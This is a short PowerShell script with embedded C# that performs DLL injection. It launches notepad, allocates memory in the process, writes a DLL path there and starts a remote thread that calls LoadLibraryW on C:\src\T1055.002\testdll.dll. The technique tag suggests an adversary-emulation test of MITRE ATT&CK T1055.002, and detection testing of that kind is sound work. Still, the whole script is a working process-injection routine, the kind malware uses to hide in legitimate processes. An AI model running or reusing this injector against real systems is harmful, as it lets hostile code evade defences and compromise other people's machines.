$process = Start-Process notepad -PassThru
$processId = $process.Id

$dllPath = "C:\src\T1055.002\testdll.dll"

$code = @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;

    public static void Inject(int processId, string dllPath) {
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), MEM_COMMIT, PAGE_READWRITE);
        byte[] bytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, addr, bytes, (uint)bytes.Length, out bytesWritten);
        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
        IntPtr loadLibAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
        uint threadId;
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, addr, 0, out threadId);
    }
}
"@

Add-Type $code

[Injector]::Inject($processId,$dllPath)
Stop-Process -Id $processId